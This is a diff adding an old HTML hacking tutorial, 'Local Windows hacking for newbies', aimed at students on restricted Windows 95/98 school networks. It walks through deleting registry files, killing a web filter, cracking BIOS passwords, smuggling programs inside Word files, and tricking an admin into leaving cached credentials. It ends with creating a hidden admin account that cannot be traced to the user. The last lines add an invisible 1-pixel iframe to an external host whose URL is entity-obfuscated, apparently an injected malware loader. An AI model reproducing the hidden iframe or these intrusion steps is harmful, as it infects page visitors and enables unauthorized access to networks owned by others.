@@ -1,0 +1,347 @@
+<html>
+<head>
+<title>Local Windows hacking for newbies</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<div align="center">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I   <b>Local Windows hacking</b>     I   Written by:     /
+    >                     I        <b>for newbies</b>          I                  <
+   /      <a href="mailto:black_mesa@hacktik.org">Martin L.</a>       I_____________________________I   <a href="mailto:miggyx@amicoders.demon.co.uk">MiggyX</a>          \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+</div>
+<h3>[Contents]</h3>
+<ol>
+  <li><a href="#1">Why would I want to hack windows?</a></li>
+  <li><a href="#2">Are there many restrictions that can be placed on me?</a></li>
+  <li><a href="#3">Where do these restrictions come from?</a></li>
+  <li><a href="#4">What is the registry?</a></li>
+  <li><a href="#5">Where is the registry?</a></li>
+  <li><a href="#6">Can I edit it myself?</a></li>
+  <li><a href="#7">I can't edit the registry. How do I get around this ?</a></li>
+  <li><a href="#8">I can't get to the registry files to delete them! What now?</a></li>
+  <li><a href="#9">I have the 'Run' command. What next?</a></li>
+  <li><a href="#10">The evil scum bags have nicked the 'Run' command! Now what?!?</a></li>
+  <li><a href="#11">So what's this magic shortcut trick then?</a></li>
+  <li><a href="#12">When I type in the directory in explorer, it returns "Access Denied". Why?</a></li>
+  <li><a href="#13">Okay, I've found the files..only I can't delete them! Windows says that are protected!</a></li>
+  <li><a href="#14">Right, I've sabotaged the files. What next?</a></li>
+  <li><a href="#15">My plans are being thwarted by this stupid registry checker! HELP!</a></li>
+  <li><a href="#16">The network is on the Internet but Cyber patrol won't let me access any hacking sites!</a></li>
+  <li><a href="#17">I can't access the disk drive or the CDROM yet I see the Admins doing it! How can I ?</a></li>
+  <li><a href="#18">When I try to access A: , the whole machine crashes on me! Why?</a></li>
+  <li><a href="#19">I MUST have floppy access! How do I get it?</a></li>
+  <li><a href="#20">Sneaking files onto a Network</a></li>
+  <li><a href="#21">Right, I've got the program. What now ?</a></li>
+  <li><a href="#22">How can I get back all those nice programs that they removed from my start menu?</a></li>
+  <li><a href="#23">How do I change this cursed background without using the display properties?</a></li>
+  <li><a href="#24">The 'Net Plug' trick</a></li>
+  <li><a href="#25">I still need DOS access to run the programs. How can I get it?</a></li>
+  <li><a href="#26">I've done that but I get "This has been disabled by your system Administrator</a></li>
+  <li><a href="#27">What the hell is poledit?</a></li>
+  <li><a href="#28">Okay, I've managed to get poledit onto the network. now what?</a></li>
+  <li><a href="#29">I think it worked but when I logged back onto the network, the old settings kicked in.</a></li>
+</ol>
+<a name="1"><h4><u>Why would I want to hack windows?</u></h4>
+<blockquote>
+<p>Well, okay stupid question but why would you want to hack windows when there are all those lovely servers to take on? The
+answer is so simple, it often eludes people altogether. How exactly are you going to take out the server if your workstation
+is so crippled, you can't even use the run command? Most hacking programs are DOS based. If your friendly Admin has removed
+MS-DOS access, you're in trouble. You won't be able to run all those nice programs you've collected.</p>
+<p>What if they Admin has placed some really horrible backdrop on your machine. You have a great replacement
+only the display properties aren't available. How do you get round that? Well, that's what this tutorial is
+all about : Removing restrictions on the local machine so that you can get a shot at the servers or so you
+can run programs that you otherwise wouldn't be able to.</p>
+</blockquote>
+<a name="2"><h4><u>Are there many restrictions that can be placed on me?</u></h4>
+<blockquote>
+<p>There are a surprising amount of things Admins can do to your computer to make it more restricted. To
+compromise of course, there are many ways to remove these annoying restrictions, one of which I worked out
+and removes all the restrictions although it temporarily screws up Internet Explorer's settings. Here is a
+small list :</p>
+<blockquote>
+<p>Control Panel<br>
+Run command<br>
+Find command<br>
+Missing start menu programs<br>
+Fixed backdrop<br>
+No DOS access<br>
+Removed CDROM and floppy access</p>
+</blockquote>
+<p>All of the above are a real pain in the ass. I'll go through removing these restrictions one by one.</p>
+</blockquote>
+<a name="3"><h4><u>Where do these restrictions come from?</u></h4>
+<blockquote>
+<p>Good question. There are two types of restriction, local and remote. The local restrictions are
+usually stored in the registry and are fairly easy to get round compared to the remote restrictions.
+These are restrictions placed on servers and are usually downloaded each time you login. They are VERY hard to
+get around and most are beyond the scope of this tutorial. However if I do show some of them, I'll point out that
+they are remote. Sometimes, the remote restrictions are enforced as local ones. This is handy to say the least.</p>
+</blockquote>
+<a name="4"><h4><u>What is the registry?</u></h4>
+<blockquote>
+<p>The registry is a database that Windows uses to store all its information. You can consider it as a directory.
+Most programs and files are registered here, along with user and system settings. Driver versions and start up
+programs are also found in here. Without the registry, Windows would be in trouble.</p>
+</blockquote>
+<a name="5"><h4><u>Where is the registry?</u></h4>
+<blockquote>
+<p>The registry consists of two files, user.dat and system.dat . Both are stored in the windows directory.
+There are backups of both files called user.da0 and system.da0 . If the main two are destroyed, the system
+copies the new versions over to replace them.</p>
+<p>The user.dat file contains user settings. All the different parts of a users settings make up a user
+profile. It is these profiles that contain the information regarding what restrictions should be enforced.
+Every user is stored here along with all their access rights. I'll show you how to fool the system into giving
+you full access the easy way later.</p>
+<p>The system.dat file strangely enough contains information about the system. This includes settings for
+Internet Explorer and other pieces of software such as DirectX, MS Office etc etc.</p>
+</blockquote>
+<a name="6"><h4><u>Can I edit it myself?</u></h4>
+<blockquote>
+<p>Yes you can, using a program called regedit. It is automatically installed and unless your friendly Admin
+has removed your ability to edit it, you can use this program to set anything in the registry that you want.</p>
+<p><b>NOTE :</b> If you remove the system.dat file ( which you usually have to ) some programs may have problems
+finding their default settings or refuse to load.</p>
+</blockquote>
+<a name="7"><h4><u>I can't edit the registry. How do I get around this ?</u></h4>
+<blockquote>
+<p>Well the easiest way is to simply remove user.dat and system.dat . When you reset the computer and login,
+it will come up and tell you that it needs to reset to repair the registry. Ignore this message and use ctrl+alt+del
+to get it to close without selecting 'ok'. You will see that all the restrictions have been removed. Quickly go to
+'Run' and type 'command' without the quotes. This will open a DOS window and for some reason stabilises the system.
+Windows had a nasty tendency to crash if I didn't open a DOS window for some reason. When you reset the computer,
+the old registry will kick in and the restrictions will be active again. This isn't so bad because it means you can
+get a machine back to normal with the minimum of fuss.</p>
+</blockquote>
+<a name="8"><h4><u>I can't get to the registry files to delete them! What now?</u></h4>
+<blockquote>
+<p>Don't panic yet! I'll show you two ways of getting to the files. Normally if the 'Run' command is missing,
+you're going to have trouble getting to the C:\windows directory which holds those files. Second,
+you'll find that they are write protected. In the next few sections I'll show you how to get round this.</p>
+</blockquote>
+<a name="9"><h4><u>I have the 'Run' command. What next?</u></h4>
+<blockquote>
+<p>Type "c:\windows\" without the quotes. This will take you to the directory that contains the registry.
+You will most likely get a message saying that altering the files could be dangerous and could stop windows
+or other programs from working. Ignore that and select continue or click the hyper link. It will now show you
+the files.</p>
+</blockquote>
+<a name="10"><h4><u>The evil scum bags have nicked the 'Run' command! Now what?!?</u></h4>
+<blockquote>
+<p>Now you panic........only joking! Most Admins do take out the run command as standard. It stops normal
+people from going where they shouldn't be. However, we can out smart them here by using the shortcut trick. This
+trick will get us whatever we need and is just as powerful as the run command, except it is slightly more
+inconvenient.</p>
+</blockquote>
+<a name="11"><h4><u>So what's this magic shortcut trick then?</u></h4>
+<blockquote>
+<p>This trick is essential to a hackers toolkit. In Windows, you can create a shortcut to just about anything from a
+folder to a program or even a website! We can use this to our advantage. It also gets round the annoying "Access Denied"
+messages that explorer likes to give. Right click on the desktop, select new -> shortcut. When it asks what you want to
+make the shortcut to, type in "c:\windows\" without the quotes and press enter. Hit enter twice more and you will find a
+nice shortcut on your desktop. Click this twice and it will dump you in the Windows directory. Nice eh?</p>
+</blockquote>
+<a name="12"><h4><u>When I type in the directory in explorer, it returns "Access Denied". Why?</u></h4>
+<blockquote>
+<p>This means that the Admin has told explorer not to accept any requests to that folder, program or website.
+However for some reason explorer will let you straight through if you make a shortcut to that folder. Security
+is tight eh?</p>
+</blockquote>
+<a name="13"><h4><u>Okay, I've found the files.....only I can't delete them! Windows says that are protected!</u></h4>
+<blockquote>
+<p>When windows says protected, it means write protected. This is when you can't write or alter a file. This
+is done for safety reasons. No one wants to accidentally delete the registry. However because we're evil we
+want to and Windows is stopping us. Don't worry, the protection is lame. Right click on the file and hit
+properties. Once in, untick the little box next to write protected and click apply then okay. Now try deleting
+the file. You should find that it goes without any hassle. This works with both registry files.</p>
+</blockquote>
+<a name="14"><h4><u>Right, I've sabotaged the files. What next?</u></h4>
+<blockquote>
+<p>To prevent Windows catching on, just turn off the computer and switch it on again. If it starts up and
+the registry fixing program starts, you'll have to repeat the procedure. Sometimes it gets you, some times
+it doesn't. If it keeps coming up, see the next section.</p>
+</blockquote>
+<a name="15"><h4><u>My plans are being thwarted by this stupid registry checker! HELP!</u></h4>
+<blockquote>
+<p>This nasty little program kept catching me out. It is called regcheck and is usually found in the windows or
+windows\system directory. It is called from an ini file called regcheck.ini or regchck.ini . The name seems
+to vary from system to system though I can't see any reason why it should. You can alter the .ini file and
+remove the checking program. The script will complete and still the registry won't have been restored!!
+Tee hee!</p>
+</blockquote>
+<a name="16"><h4><u>The network is on the Internet but Cyber patrol won't let me access any hacking sites!</u></h4>
+<blockquote>
+<p>Cyber patrol is a royal pain in the ass! However, it is very easy to remove. Press ctrl+alt+del to bring
+up the task list. Select Cyber Patrol and press enter. Cyber Patrol will now bring up a window asking for a
+password. Damn, we've been beaten! Not so, press ctrl+alt+del again. This time because Cyber Patrol has ALREADY
+answered windows, it won't access again. Thus Windows thoughtfully lets us close the program.
+Bye bye stupid restrictions!</p>
+</blockquote>
+<a name="17"><h4><u>I can't access the disk drive or the CDROM yet I see the Admins doing it! How can I ?</u></h4>
+<blockquote>
+<p>This can be quite annoying. You have lots of stuff on disk or CD but you just can't access them. Why?
+Because some sod has removed their icons from 'My Computer'. *Sigh* I guess its no go then right? Wrong!
+Although you can't see the drives, they are still there. Load up ole faithful Internet Explorer and type
+"D:\" without the quotes and press Enter. It should display a list of the files on the CD. If it comes up
+with "Access Denied" or " Permission Denied" then simply make a shortcut to it. That way, you will see
+all the files.</p>
+</blockquote>
+<a name="18"><h4><u>When I try to access A: , the whole machine crashes on me! Why?</u></h4>
+<blockquote>
+<p>This happens when the floppy drive has been disabled in the BIOS ( Basic Input Output System).
+When you try to access it, Windows will hang and force you to reboot. There is a nice easy way of testing
+if the drive is open before you crash your machine. When you log in or out, check the light on the drive.
+If it flashes, the drive is available even if you can't see it in the drive list. If it doesn't flash,
+the drive has been disabled.</p>
+</blockquote>
+<a name="19"><h4><u>I MUST have floppy access! How do I get it?</u></h4>
+<blockquote>
+<p>The only way to get disk access is to enable the floppy drive in BIOS. This is almost ALWAYS
+passworded ( if not you're really lucky ). You will need a BIOS cracker and there are loads on the
+Internet. Check what BIOS the machine has when it boots up ( Award, AmiBIOS etc etc). Get a program for
+that. Obviously you will somehow need to get it on the Network and there is a cunning way to do that to!</p>
+</blockquote>
+<a name="20"><h4><u>Sneaking files onto a Network</u></h4>
+<blockquote>
+<p>This trick is so simple and yet so effective. Create a document that you could pass off as school
+work or something. Make sure it has an image file in it. Drag and drop the program file into your document
+and then place the Image file over it. Save as a .doc file and put it on a disk. Ask your friendly Admin to
+copy the file for you. Most will just copy it and those that check will just see a document with a piccy.
+They won't see your program. To get the program back, you need to open the document on your workstation.
+Drag the program back out and put it on your desktop. This trick works with any file of any type.</p>
+</blockquote>
+<a name="21"><h4><u>Right, I've got the program. What now ?</u></h4>
+<blockquote>
+<p>Run the program. It should give you a password. Write this down and reset the machine. As the machine
+checks its memory press the 'Del' button. It will then take you into the BIOS where it will prompt for the
+password. Enter the password that you got from the program. It should let you in. Go into the Basic options
+and look for floppy drive. Go to the first one. It probably says "Not Installed". Change it so it says "3 1/2
+inch floppy". Quit the BIOS and save changes. When it boots up, the floppy drive will be active. Do the reverse
+to disable it again to stop Admins finding you and changing the password.</p>
+</blockquote>
+<a name="22"><h4><u>How can I get back all those nice programs that they removed from my start menu?</u></h4>
+<blockquote>
+<p>This is also quite easy. There is a program called groupconv.exe . By running this, you'll restore
+the default star menu along with all the usual programs and accessories. Useful if the Admin has removed some
+program that you prefer or want to use like Paint brush. You'll need paint to pull off the next trick.</p>
+</blockquote>
+<a name="23"><h4><u>How do I change this cursed background without using the display properties?</u></h4>
+<blockquote>
+<p>Not so useful perhaps but nice to have none the less. No one likes the default backgrounds but Admins
+tend to remove the ability to change them which is rather upsetting. To pull this off, you need access to
+paint. Normally this isn't removed. Open your bitmap of choice into paint. From the 'File' menu, select "Set
+as background". This will set your bitmap as the background. Normally this won't stay the same and will change
+back next time you login. Still, you get a decent background for the duration of your session.</p>
+</blockquote>
+<a name="24"><h4><u>The 'Net Plug' trick</u></h4>
+<blockquote>
+<p>This is a nice easy way of getting Admin rights. I've taken this from my other tutorial and pasted
+it here because I don't want to have to type it out again. It is a very useful technique which is why
+I'm duplicating it here.</p>
+<p>This is an attack that I worked out myself before I was given Admin status. It always works and I've
+yet to see it fail. Make sure you are at a windows 95 or 98 machine. I doubt NT would be fooled by this trick
+but I don't have any NT machines so I can't test it for you.</p>
+<p><b>Note :</b> Most Admins, believe that they are the most knowledgeable about their system. Many also
+believe that no one else knows much about computers. In other words, for whatever reasons, they are not
+too concerned about us i.e. the idiots attacking their servers. Why? Because we aren't good enough. So why
+waste valuable time configuring security that won't be needed eh? I think I've made my point. They don't see
+us as a threat. You don't consider a house spider a threat so you don't go round putting up netting to keep
+them out. Why? You can't be bothered. The same rule applies here. Even if you are a computer genius, play it
+dumb. Admins like to lecture the uninitiated and would love to appear smarter than you. This is the way you
+want it. The Admins will think you're a nice guy or gal, totally harmless. This sometimes gives you more
+leverage because they like you, they'll be willing to help you. They also won't expect you to launch a huge
+assault on their servers either However sometimes there are some smart people out there who will notice your
+talents and pull you over to their side. This isn't a bad place to be and can be advantageous later.</p>
+<p>First of all, login as yourself. Crash your computer and reset it . Walk over to your favourite admin (the one
+that hates you most is the best choice ) and apologise for being an idiot but the computer won't let you login and
+could s/he please come and take a look for you. Mumbling and grumbling they'll come over. The best way to test if
+it is the machine is for them to login. Of course, they'll log in as an admin or equivalent. They'll check your
+account and see that your account is fine. They'll tell you to log onto another machine and your account will be
+okay. They'll now log off and walk off in disgust thinking you are a computer moron. Not so my friend, we've just
+done them good and proper!</p>
+<p>Turn off the computer and pull out the network lead. Turn it back on again. The computer will detect that
+you aren't on a network and will dump you at a desktop with restrictions of the last user. If this user is the
+admin then chances are that he or she will have full access to everything including DOS and drive access. Perfect
+for installing all those really kewl programs you have on a disk in your pocket......</p>
+<p>But you aren't on the network now. That's no fun is it? Shove the lead back in and try to access a network
+drive. This is the bit where you hope the Admins are sloppy or not computer geniuses. Windows by default caches
+ALL passwords so unless the Admins have told it not to ( a key deep in the registry) then windows will have a nice
+copy of their password. Go into 'My Computer' and click on a drive. Whoop with glee as Netware logs you in as an
+Admin. Why does this happen? Well windows still holds the username and password last used to access the drive.
+You are logged into windows as Admin and windows knows what credentials you last gave to the server. So it
+supplies them for you. Likewise because you are now authenticated you know have full access to the NDS tree.
+Not only can you read but you can no write, modify delete etc etc. Much more fun!</p>
+<p>Now, this is the bit where you have to be sneaky. You have to make a new account for yourself or upgrade your
+old one. There are pros and cons to each of your choices. If you alter your existing account and they check it for
+some reason ( maybe you got locked out? ) they'll notice you have admin rights and shoot you. If you make a new
+user, it might get found quicker but there is no way to point to you ( it was created by user admin after all
+tee hee ). The choice is yours. You can always do both.</p>
+</blockquote>
+<a name="25"><h4><u>I still need DOS access to run the programs. How can I get it?</u></h4>
+<blockquote>
+<p>Not all Admins actually remove the ability to run DOS programs, simply because they are needed. It is likely
+though that the shortcuts and the run command will have been removed. Also I doubt you will be able to shutdown
+into MS-DOS mode. So how do you call up the window?</p>
+<p>Well, we can use our usual shortcut trick. The program that opens the DOS windows is called "command.exe" .
+To run the program, simply make a shortcut to "command" without the quotes. Double clicking on the shortcut will
+pull up the MS-DOS prompt.</p>
+</blockquote>
+<a name="26"><h4><u>I've done that but I get "This has been disabled by your system Administrator</u></h4>
+<blockquote>
+<p>If you get this, your Admin has locked out the ability for your user to run DOS programs. Windows is suprisingly
+tight on DOS access. There is only ONE way that I currently know of ( I'm always searching for new ones though) to
+bypass this whilst logged in as yourself. To do this, you need a program called "poledit.exe".</p>
+</blockquote>
+<a name="27"><h4><u>What the hell is poledit?</u></h4>
+<blockquote>
+<p>Poledit ( short for policy editor ) is the program used to alter user settings on any given computer. This program
+edits the user.dat file that we saw earlier. It might have occured to some Admins to block access but I have yet to
+see it done. Normally registry editing is barred but that seems to be only when using regedit.</p>
+<p>Poledit is NOT installed by default. You will find it on the Windows 98 CD in the resource kit folder. The file
+itself isn't very big and it doesn't need any support files. You can sneak it onto the network by hiding it in a Word
+file. If you have CDROM access, you could just load it in, or burn the program to CD.</p>
+<p>Poledit controls ALL the access rights such as control panel access, display properties, find and run commands,
+DOS access, shutting down to MSDOS mode etc etc. This tool can give them all back to you!</p>
+</blockquote>
+<a name="28"><h4><u>Okay, I've managed to get poledit onto the network. now what?</u></h4>
+<blockquote>
+<p>Right, run the program. It will bring up a list of users and their policies. There will probably be two
+policies stored there ( at least). One will be called Admin or similar and the other default. You will be user
+default. Now, alter the settings to whatever you want and save them. Quit the program and you should find that
+your access has been increased!</p>
+</blockquote>
+<a name="29"><h4><u>I think it worked but when I logged back onto the network, the old settings kicked in.</u></h4>
+<blockquote>
+<p>This is a pain because it means your settings are stored on the server too. When it logs in, it activates
+the settings you updated and then overlays the new ones from the server. Annoying huh? Well there isn't all
+that much you can do about it apart from use the Net Plug trick.</p>
+<p>How does it help us here? Well, turn off the computer, unplug the network lead and turn it back on. It will
+automatically log you in as the last user, i.e yourself. However because there is no server, it will pull its
+restrictions from the local file ( which we edited of course). Plug the network lead back into the computer
+and try to access the drives. Even if it asks you to login again ( to access the network ), Windows isn't clever
+enough to pull off the updated policy files. You're home free!!</p>
+</blockquote>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
